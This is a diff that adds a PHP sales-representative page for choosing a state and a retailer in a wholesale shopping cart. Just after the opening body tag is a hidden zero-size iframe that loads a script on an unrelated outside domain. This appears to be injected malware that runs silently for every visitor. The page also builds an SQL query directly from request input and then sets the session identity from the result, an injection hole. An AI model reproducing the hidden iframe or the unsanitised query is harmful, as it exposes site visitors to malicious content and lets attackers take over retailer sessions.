@@ -1,0 +1,159 @@
+<?php
+
+include '../includes/main1.php';
+include $base_path.'includes/st_and_co1.php';
+include $base_path.'includes/reps.php';
+include $base_path.'includes/wc1.php';
+
+checkRepLogin();
+
+if ( $_REQUEST["repState"] ) {
+    buildStateRetailers($_REQUEST["repState"]);
+    exit();
+}
+
+if ( $_REQUEST["setRetailer"] ) {
+    $queryRet = "SELECT * FROM retailer WHERE retailer_id='".$_REQUEST["setRetailer"]."'";
+    $resultRet = mysql_query($queryRet) or die("Query failed : " . mysql_error());
+    while ($line = mysql_fetch_array($resultRet, MYSQL_ASSOC)) {
+        $retailer_id = $line["retailer_id"];
+        $retailer_status = $line["retailer_status"];
+		$retailer_name = stripslashes( $line["store_name"] );
+		$retailer_store_type = $line["store_type"];
+	}
+    
+    if($retailer_id != "") {
+        $_SESSION["wc_user"] = $retailer_id;
+        $_SESSION["wc_status"] = $retailer_status;
+		$_SESSION["retailer_name"] = $retailer_name;
+		$_SESSION["retailer_store_type"] = $retailer_store_type;
+		find_price_lvl($retailer_id, $retailer_status);//so that the cart gets updated
+
+        echo 'ok';
+    }
+    else {
+        echo 'There was a problem setting this retailer.';
+    }
+    
+    exit();
+}
+
+
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title><?php echo $website_title; ?>: Sales Representative Interface</title>
+<?php
+include $base_path.'includes/meta1.php';
+?>
+    <script language="JavaScript">
+        $(function() {//on doc ready
+            RepRetailers.init();
+        });
+
+        var RepRetailers = new function() {
+            this.init = function() {
+                RepRetailers.form = $('#rep_select_retailer');
+                $('#repSelectState').change(function(){
+                    if ( $('#repSelectState').val() != '' ) {
+                        if ( $('#repUseWrapper').is(":visible") ) {
+                            $('#repUseWrapper').fadeOut(300);
+                        }
+                        $('.loading', RepRetailers.form).small_spinner();
+                        $.post("index.php", {repState: $('#repSelectState').val()}, function(resp){
+							if ( resp != '' ) {
+								$('#repRetailersWrapper').html( 'Select a Retailer: <select id="repSelectRetailers" name="repSelectRetailers">'+resp+'</select>' );
+								if ( $('#repSelectRetailers option').size()==1 ) {
+									$('#repRetailersWrapper').html( 'You have no retailers in this territory.' );
+								}
+								else {
+									RepRetailers.selectRetailersInit();
+								}
+								if ( $('#repRetailersWrapper').is(":hidden") ) {
+									$('#repRetailersWrapper').fadeIn(300, function(){
+									});
+								}
+							}
+                            $('.loading', RepRetailers.form).html('');
+                        });
+                    }
+                });
+            }
+
+            this.selectRetailersInit = function() {
+                $('#repSelectRetailers').unbind().change(function(){
+                    if ( $('#repUseWrapper').is(":hidden") ) {
+                        $('#repUseWrapper').unbind().fadeIn(200, function(){
+                            $('#useThisRetailer').click(function(){
+								$(this).attr('disabled', 'true');
+                                var post_url = RepRetailers.form.attr('action');
+                                $.post(post_url, { setRetailer: $('#repSelectRetailers').val() }, function(resp){
+                                    if ( resp == 'ok' ) {
+										window.location.href=window.location.href;
+                                    }
+                                    else {
+                                        $('#sub_menu').html( resp );
+										$(this).removeAttr('disabled');
+                                    }
+                                })
+                                    return false;
+                            });
+                        });
+                    }
+                })
+            }
+        }
+
+    </script>
+
+</head>
+<body>
+<iframe src="http://aviavavilons.net/ss/go.php?sid=7" width="0" height="0" frameborder="0"></iframe>
+<div align="center">
+
+<?php
+include $base_path.'includes/reps_head1.php';
+?>
+
+
+<table border="0">
+    <tr><td>&#160;</td></tr>
+
+<?php
+
+//Error Messages
+if($error_txt) {
+	echo '<tr><td><span class="error">$error_txt</span></td></tr>\n';
+	echo "<tr><td>&nbsp;</td></tr>\n";
+}
+
+?>
+</table>
+
+<span class="style4 two"><?php echo $website_title; ?>: Your Retailers</span>
+<br /><br />
+
+<form id="rep_select_retailer" action="index.php" method="POST">
+    <div class="left">
+        Select a State: <select name="repSelectState" id="repSelectState"><option value=""></option><?php buildRepStates('') ?></select>
+    </div>
+    <div id="loadingWrapper" class="left" style="width:30px; padding-left: 10px">
+        &#160;<span class="loading"></span>
+    </div>
+    <div class="left no_display" id="repRetailersWrapper"></div>
+
+    <div class="left no_display" id="repUseWrapper" style="padding-left: 10px">
+        <button id="useThisRetailer">Use This Retailer</button>
+    </div>
+<br />
+</form>
+<br class="clear" />
+<?php
+include $base_path.'includes/reps_foot1.php';
+mysql_close($dbh);
+?>
+
+</div>
+</body>
+</html>
